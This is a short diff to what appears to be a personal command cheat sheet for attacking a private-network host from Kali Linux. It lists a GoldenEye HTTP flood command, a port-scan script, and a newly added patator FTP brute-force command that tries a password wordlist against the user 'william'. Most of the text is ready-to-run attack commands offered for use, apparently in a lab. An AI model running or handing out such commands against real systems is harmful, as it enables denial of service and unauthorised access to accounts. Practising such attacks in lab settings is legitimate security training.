@@ -6,3 +6,4 @@
     - cd /home/kali/Desktop/GoldenEye/GoldenEye
     - sudo ./goldeneye.py http://192.168.189.133:80/ -s 10 -m random 
 4. scan port: sudo python /home/kali/Desktop/script_data/portscan_new.py
+5. FTP: sudo patator ftp_login user=william password=FILE0 0=/home/kali/Desktop/Brute-force-SSH-service/passwords.txt host=192.168.189.133 -x ignore:fgrep='Access denied for user'
